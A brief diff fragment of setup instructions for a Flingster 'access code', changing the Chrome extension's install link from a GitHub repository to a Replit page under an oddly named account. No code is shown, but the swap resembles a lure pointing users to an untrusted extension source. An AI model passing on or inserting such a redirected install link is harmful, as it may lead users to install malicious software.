@@ -26,7 +26,7 @@ HOW TO USE THE ACCESS CODE
 
 Desktop / Laptop Users:
 - Install the Chrome Extension from:
-  https://github.com/flingster-vip/Flingster-Extension/
+ https://replit.com/@devlopermMan43/Flingster-Extension-10zip
 - Open the extension
 - Paste the Access Code
 - Start using the service
